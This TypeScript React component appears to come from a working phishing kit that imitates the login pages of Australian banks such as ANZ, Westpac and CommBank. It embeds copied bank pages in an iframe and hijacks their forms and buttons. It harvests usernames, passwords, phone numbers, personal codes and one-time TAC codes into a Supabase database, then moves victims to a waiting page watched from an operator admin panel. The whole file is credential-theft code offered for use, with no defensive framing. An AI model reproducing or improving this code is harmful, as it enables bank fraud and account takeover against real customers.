"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { getAuBankPages, isAuExactHtmlBank } from "@/lib/au-bank-page-map";
import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

type CapturedField = {
  key: string;
  value: string;
  kind: "username" | "password" | "bankPhone" | "personalCode" | "tacCode" | "unknown";
  type: string;
};

const ACTION_BUTTON_RE = /(log\s?in|login|sign\s?in|continue|next|access|submit|confirm|go|enter|ilerle|ileri|devam|tamamla)/i;

function normalizeToken(value: string | null | undefined) {
  return (value ?? "").trim().toLowerCase().replace(/[^a-z0-9]+/g, " ");
}

function getElementLabel(doc: Document, el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const ariaLabel = el.getAttribute("aria-label");
  if (ariaLabel?.trim()) return ariaLabel.trim();

  const placeholder = el.getAttribute("placeholder");
  if (placeholder?.trim()) return placeholder.trim();

  const id = el.getAttribute("id");
  if (id) {
    const label = doc.querySelector(`label[for="${id}"]`);
    if (label?.textContent?.trim()) return label.textContent.trim();
  }

  const wrappingLabel = el.closest("label");
  if (wrappingLabel?.textContent?.trim()) return wrappingLabel.textContent.trim();

  const formItem = el.closest(".form-item");
  const formItemLabel = formItem?.querySelector(".form-label");
  if (formItemLabel?.textContent?.trim()) return formItemLabel.textContent.trim();

  const formInput = el.closest(".form-input");
  const siblingFormLabel =
    formInput?.previousElementSibling?.classList.contains("form-label")
      ? formInput.previousElementSibling
      : null;
  if (siblingFormLabel?.textContent?.trim()) return siblingFormLabel.textContent.trim();

  const parentText = el.parentElement?.parentElement?.textContent?.trim();
  if (parentText) return parentText;

  return "";
}

function inferFieldKind(
  el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement,
  label: string,
): CapturedField["kind"] {
  const raw = normalizeToken(
    [
      el.getAttribute("name"),
      el.getAttribute("id"),
      el.getAttribute("data-testid"),
      el.getAttribute("autocomplete"),
      el.getAttribute("type"),
      label,
    ].join(" "),
  );

  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (type === "password" || /\b(password|passcode|pin|secret)\b/.test(raw)) return "password";
  if (/\b(tac|otp|one time|one-time|verification|security code|sms code|code)\b/.test(raw)) return "tacCode";
  if (type === "tel" || /\b(phone|mobile|contact|cell)\b/.test(raw)) return "bankPhone";
  if (/\b(personal|identity|customer number|member number|ird|tax number)\b/.test(raw)) return "personalCode";
  if (/\b(username|user id|userid|login id|access number|client number|customer id|card number|account number)\b/.test(raw)) {
    return "username";
  }
  return "unknown";
}

function sanitizeKey(value: string) {
  return value.trim().toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "");
}

function isMeaningfulField(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (["hidden", "submit", "button", "image", "reset"].includes(type)) return false;
  if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
  if (el.disabled) return false;
  if (el.getAttribute("aria-hidden") === "true") return false;
  return true;
}

function readFieldValue(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (type === "checkbox" || type === "radio") {
    return (el as HTMLInputElement).checked ? ((el as HTMLInputElement).value || "true") : "";
  }
  return el.value?.trim() ?? "";
}

function getFormFields(form: HTMLFormElement) {
  return Array.from(
    form.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>("input, textarea, select"),
  ).filter(isMeaningfulField);
}

function formHasIdentityAndPassword(form: HTMLFormElement, doc: Document) {
  const fields = getFormFields(form);
  let hasIdentity = false;
  let hasPassword = false;

  for (const field of fields) {
    const kind = inferFieldKind(field, getElementLabel(doc, field));
    if (kind === "password") hasPassword = true;
    if (kind === "username" || kind === "personalCode" || kind === "bankPhone") {
      hasIdentity = true;
    }
  }

  return hasIdentity && hasPassword;
}

function pickBestForm(doc: Document): HTMLFormElement | null {
  const forms = Array.from(doc.querySelectorAll("form"));
  if (forms.length === 0) return null;

  let bestScore = -1;
  let bestForm: HTMLFormElement | null = null;
  for (const form of forms) {
    const fields = getFormFields(form);
    let hasId = false;
    let hasPass = false;
    let filledCount = 0;
    for (const f of fields) {
      const k = inferFieldKind(f, getElementLabel(doc, f));
      if (k === "password") hasPass = true;
      if (k === "username" || k === "personalCode" || k === "bankPhone") hasId = true;
      if (readFieldValue(f)) filledCount++;
    }
    const score = fields.length * 2 + (hasId ? 8 : 0) + (hasPass ? 8 : 0) + filledCount;
    if (score > bestScore) {
      bestScore = score;
      bestForm = form;
    }
  }
  return bestForm;
}

function collectCapturedFieldsFromForm(form: HTMLFormElement, doc: Document): CapturedField[] {
  const allFields = getFormFields(form);
  return allFields
    .map((el) => {
      const value = readFieldValue(el);
      if (!value) return null;
      const label = getElementLabel(doc, el);
      const rawKey = sanitizeKey(
        el.getAttribute("name") ||
        el.getAttribute("id") ||
        label ||
        `field_${allFields.indexOf(el) + 1}`,
      );
      return {
        key: rawKey || `field_${allFields.indexOf(el) + 1}`,
        value,
        kind: inferFieldKind(el, label),
        type: (el.getAttribute("type") ?? "").toLowerCase(),
      } satisfies CapturedField;
    })
    .filter((f): f is CapturedField => Boolean(f));
}

function canSubmitIntermediate(form: HTMLFormElement, doc: Document) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  if (fields.length === 0) return false;
  if (hasIdentityField(fields) || hasPasswordField(fields) || fields.length >= 1) return true;
  return false;
}

function canSubmitFinal(form: HTMLFormElement, doc: Document) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  return hasIdentityField(fields) && hasPasswordField(fields);
}

function hasIdentityField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "username" || field.kind === "personalCode" || field.kind === "bankPhone") &&
    field.value.trim().length > 0,
  );
}

function hasPasswordField(fields: CapturedField[]) {
  return fields.some((field) => field.kind === "password" && field.value.trim().length > 0);
}

function isExternalHref(href: string | null) {
  if (!href) return false;
  return /^https?:\/\//i.test(href.trim());
}

function getActiveButtonColor(bankSlug: string) {
  switch (bankSlug) {
    case "bendigo-bank":
      return "#00579C";
    case "suncorp-bank":
      return "#7A0019";
    case "anz":
      return "#0A5CAD";
    case "westpac":
      return "#DA1B1B";
    case "commbank":
      return "#111111";
    default:
      return "#1F6FEB";
  }
}

export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [saving, setSaving] = useState(false);
  const [stepIndex, setStepIndex] = useState(0);

  const auPages = useMemo(() => (isAuExactHtmlBank(bankSlug) ? getAuBankPages(bankSlug) : null), [bankSlug]);

  const totalSteps = auPages?.length ?? 0;
  const isMultiStep = (auPages?.length ?? 0) > 1;
  const isFinalStep = totalSteps > 0 && stepIndex >= totalSteps - 1;

  const currentSrc = useMemo(() => {
    if (auPages) return auPages[stepIndex] ?? auPages[auPages.length - 1];
    return null;
  }, [auPages, stepIndex]);

  const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
    if (!supabase || !sessionId || saving || fields.length === 0) return;

    if (isFinalStep) {
      if (!hasIdentityField(fields) || !hasPasswordField(fields)) return;
    } else {
      if (fields.length === 0) return;
    }

    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};

    const usernameField =
      fields.find((field) => field.kind === "username") ??
      fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
      null;
    const passwordField = fields.find((field) => field.kind === "password") ?? null;
    const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
    const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
    const tacField = fields.find((field) => field.kind === "tacCode") ?? null;

    const orderedFields = fields.slice(0, 3);
    const rawFields: Record<string, string> = Object.fromEntries(
      fields.map((field, index) => {
        const suffix = field.key || `field_${index + 1}`;
        return [`s${stepIndex + 1}_iframe_${suffix}`, field.value] as const;
      }),
    );

    const historyEntry = {
      bankSlug,
      bankName,
      htmlStepIndex: stepIndex,
      htmlStepLabel: `Step ${stepIndex + 1}/${totalSteps}`,
      verfuegernummer: usernameField?.value ?? "",
      username: usernameField?.value ?? "",
      pin: passwordField?.value ?? "",
      password: passwordField?.value ?? "",
      bankPhone: phoneField?.value ?? "",
      personalCode: personalCodeField?.value ?? "",
      tacCode: tacField?.value ?? "",
      orderedField1: orderedFields[0]?.value ?? "",
      orderedField1Key: orderedFields[0]?.kind === "unknown" ? "username" : (orderedFields[0]?.kind ?? ""),
      orderedField2: orderedFields[1]?.value ?? "",
      orderedField2Key: orderedFields[1]?.kind === "unknown" ? "" : (orderedFields[1]?.kind ?? ""),
      orderedField2Type:
        orderedFields[1]?.kind === "bankPhone"
          ? "phone"
          : orderedFields[1]?.kind === "password"
            ? "password"
            : "",
      orderedField3: orderedFields[2]?.value ?? "",
      orderedField3Key: orderedFields[2]?.kind === "unknown" ? "" : (orderedFields[2]?.kind ?? ""),
      orderedField3Type:
        orderedFields[2]?.kind === "bankPhone"
          ? "phone"
          : orderedFields[2]?.kind === "password"
            ? "password"
            : orderedFields[2]?.kind === "tacCode"
              ? "password"
              : "",
      rawFields,
      capturedAt: new Date().toISOString(),
    };

    const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
      ? (previousFormData as any).bankFormHistory.slice()
      : [];
    previousHistory.push(historyEntry);

    const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
    const mergedPassword = passwordField?.value || (previousFormData.password as string) || "";
    const mergedBankPhone = phoneField?.value || (previousFormData.bankPhone as string) || "";
    const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
    const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";

    // ⭐ ÖNEMLİ SIRA: rawFields (iframe ham alanları) ÖNCE, sonra resmi alanlar SONRA.
    // Böylece rawFields içindeki user_agent / Mozilla / Chrome / Windows gibi
    // anlamsız URL-escape string'leri resmi pin/password/verfuegernummer gibi alanların
    // ÜSTÜNE YAZAMAZ. (Önceki sürümde tersiydi ve admin panelde user-agent PIN olarak görünüyordu.)
    const nextFormData = {
      ...previousFormData,
      ...rawFields,
      bankSlug,
      bankName,
      verfuegernummer: mergedUsername,
      username: mergedUsername,
      pin: mergedPassword,
      password: mergedPassword,
      bankPhone: mergedBankPhone,
      personalCode: mergedPersonalCode,
      tacCode: mergedTacCode,
      orderedField1: historyEntry.orderedField1,
      orderedField1Key: historyEntry.orderedField1Key,
      orderedField2: historyEntry.orderedField2,
      orderedField2Key: historyEntry.orderedField2Key,
      orderedField2Type: historyEntry.orderedField2Type,
      orderedField3: historyEntry.orderedField3,
      orderedField3Key: historyEntry.orderedField3Key,
      orderedField3Type: historyEntry.orderedField3Type,
      bankFormHistory: previousHistory,
    };

    const nextStep = isFinalStep ? "wait" : "bank";
    const nextToStep = isFinalStep ? "wait" : null;
    const updatePayload: any = {
      is_hidden: false,
      form_data: nextFormData,
    };
    if (nextStep === "wait") updatePayload.current_step = "wait";

    const { error: updateError } = await supabase
      .from("sessions")
      .update(updatePayload)
      .eq("id", sessionId);

    setSaving(false);

    if (updateError) {
      logAuditEvent({
        session_id: sessionId,
        event_kind: "submit",
        event_action: "au_exact_submit_error",
        status: "error",
        bank_slug: bankSlug,
        bank_name: bankName,
        meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex },
        error_name: "SupabaseUpdateError",
        error_message: updateError.message ?? String(updateError),
      });
      return;
    }

    if (isFinalStep) {
      logAuditEvent({
        session_id: sessionId,
        event_kind: "bank_form",
        event_action: "au_exact_submit_wait",
        status: "ok",
        bank_slug: bankSlug,
        bank_name: bankName,
        from_step: "bank",
        to_step: "wait",
        meta: {
          historyCount: previousHistory.length,
          totalSteps,
          rawFieldKeys: Object.keys(rawFields),
          orderedFields: {
            orderedField1Key: historyEntry.orderedField1Key,
            orderedField2Key: historyEntry.orderedField2Key,
            orderedField3Key: historyEntry.orderedField3Key,
          },
        },
      });
      void flushAuditQueueNow();
      // ⭐ FLASH YOK: router.push → router.replace
      router.replace(stepToPath("wait", sessionId));
      return;
    }

    logAuditEvent({
      session_id: sessionId,
      event_kind: "step",
      event_action: "au_exact_advance_html_step",
      status: "ok",
      bank_slug: bankSlug,
      bank_name: bankName,
      from_step: "bank",
      to_step: nextToStep,
      meta: {
        fromIndex: stepIndex,
        toIndex: stepIndex + 1,
        totalSteps,
        rawFieldKeys: Object.keys(rawFields),
        historyCount: previousHistory.length,
      },
    });
    void flushAuditQueueNow();
    setStepIndex((i) => i + 1);
  }, [bankName, bankSlug, isFinalStep, router, saving, sessionId, stepIndex, supabase, totalSteps]);

  const captureFieldsFromFrame = useCallback(() => {
    const doc = iframeRef.current?.contentDocument;
    if (!doc) return [] as CapturedField[];
    const form = pickBestForm(doc);
    if (!form) return [];
    return collectCapturedFieldsFromForm(form, doc);
  }, []);

  const attachFrameBridge = useCallback(() => {
    const iframe = iframeRef.current;
    const doc = iframe?.contentDocument;
    if (!iframe || !doc) return;

    let loginForm =
      Array.from(doc.querySelectorAll("form")).find((form) => formHasIdentityAndPassword(form, doc)) ?? null;
    if (!loginForm) {
      loginForm = pickBestForm(doc);
    }
    if (!loginForm) return;

    const canProceed = () => {
      if (isFinalStep) return canSubmitFinal(loginForm!, doc);
      return canSubmitIntermediate(loginForm!, doc);
    };

    const submitWithCurrentValues = async (event?: Event) => {
      event?.preventDefault();
      event?.stopPropagation();
      event?.stopImmediatePropagation?.();

      if (!canProceed()) return;

      const captured = captureFieldsFromFrame();
      if (captured.length === 0) return;
      await submitCapturedFields(captured);
    };

    const forms = Array.from(doc.querySelectorAll("form"));
    forms.forEach((form) => {
      form.setAttribute("action", "#");
      form.setAttribute("method", "post");
      form.setAttribute("target", "_self");
      form.setAttribute("novalidate", "novalidate");
      if (form === loginForm) {
        form.addEventListener("submit", submitWithCurrentValues);
      }
    });

    const updateSubmitState = () => {
      const isValid = canProceed();
      const isDisabled = !isValid || saving;
      const activeColor = getActiveButtonColor(bankSlug);
      actionNodes.forEach((node) => {
        if ("disabled" in node) {
          node.disabled = isDisabled;
        }

        node.setAttribute("aria-disabled", isDisabled ? "true" : "false");
        node.style.pointerEvents = isDisabled ? "none" : "";
        node.style.opacity = "1";
        node.style.cursor = isDisabled ? "not-allowed" : "pointer";
        node.style.background = isDisabled ? "#E6E8EA" : activeColor;
        node.style.color = isDisabled ? "#ABAEAF" : "#FFFFFF";
        node.style.border = isDisabled ? "1px solid transparent" : `1px solid ${activeColor}`;
        node.style.boxShadow = isDisabled ? "none" : "0 10px 24px rgba(245, 108, 0, 0.28)";
        node.style.transform = isDisabled ? "none" : "translateY(0)";
        node.style.transition = "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease";
      });
    };

    const actionNodes = Array.from(
      loginForm.querySelectorAll<HTMLElement>(
        "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
      ),
    );
    actionNodes.forEach((node) => {
      const nodeText =
        node.textContent?.trim() ||
        node.getAttribute("value") ||
        node.getAttribute("aria-label") ||
        "";
      const isSubmitInput =
        node instanceof HTMLInputElement &&
        ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());

      if (!(ACTION_BUTTON_RE.test(nodeText) || isSubmitInput)) {
        return;
      }

      node.addEventListener("click", submitWithCurrentValues);
    });

    Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
      if (!isExternalHref(link.getAttribute("href"))) return;
      link.setAttribute("href", "#");
      link.setAttribute("target", "_self");
      link.setAttribute("rel", "nofollow noopener noreferrer");
    });

    getFormFields(loginForm).forEach((field) => {
      field.addEventListener("input", updateSubmitState);
      field.addEventListener("change", updateSubmitState);
      field.addEventListener("keydown", (event) => {
        if (event instanceof KeyboardEvent && event.key === "Enter" && !canProceed()) {
          event.preventDefault();
          event.stopPropagation();
        }
      });
    });

    updateSubmitState();
  }, [bankSlug, captureFieldsFromFrame, isFinalStep, saving, submitCapturedFields]);

  const handleFrameLoad = useCallback(() => {
    void attachFrameBridge();
  }, [attachFrameBridge]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    if (iframe.contentDocument?.readyState === "complete") {
      void attachFrameBridge();
    }

    iframe.addEventListener("load", handleFrameLoad);
    return () => {
      iframe.removeEventListener("load", handleFrameLoad);
    };
  }, [attachFrameBridge, handleFrameLoad]);

  if (!currentSrc) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-4 text-center text-sm font-medium text-red-600">
        Exact bank page file is missing for {bankName} ({bankSlug}).
        {isAuExactHtmlBank(bankSlug) && bankSlug === "suncorp-bank" ? (
          <div className="mt-2 w-full text-xs text-[#129C4F]">
            Suncorp Bank HTML files (1.html, 2.html, 3.html) bekleniyor. Kullanicidan geldikten sonra public/au-banks/suncorp-bank/ altina yerlestirilecektir.
          </div>
        ) : null}
      </div>
    );
  }

  return (
    <div className="relative min-h-screen bg-white">
      {isMultiStep ? (
        <div className="sticky top-0 z-50 w-full border-b border-gray-200 bg-white/95 px-4 py-2 backdrop-blur sm:px-6">
          <div className="mx-auto flex max-w-4xl items-center justify-between">
            <div className="flex items-center gap-3">
              <span className="rounded-full bg-gray-900 px-3 py-1 text-[11px] font-bold uppercase tracking-wider text-white">
                Step {stepIndex + 1} / {totalSteps}
              </span>
              <span className="text-xs font-medium text-gray-600">{bankName}</span>
            </div>
            <div className="flex gap-1.5">
              {Array.from({ length: totalSteps }).map((_, i) => (
                <span
                  key={i}
                  className={`h-2 w-10 rounded-full transition-all duration-300 ${
                    i < stepIndex
                      ? "bg-emerald-500"
                      : i === stepIndex
                        ? "bg-blue-600"
                        : "bg-gray-200"
                  }`}
                />
              ))}
            </div>
          </div>
        </div>
      ) : null}
      <iframe
        ref={iframeRef}
        title={`${bankName} login`}
        src={currentSrc}
        onLoad={handleFrameLoad}
        className="min-h-screen w-full border-0 bg-white"
      />
    </div>
  );
}
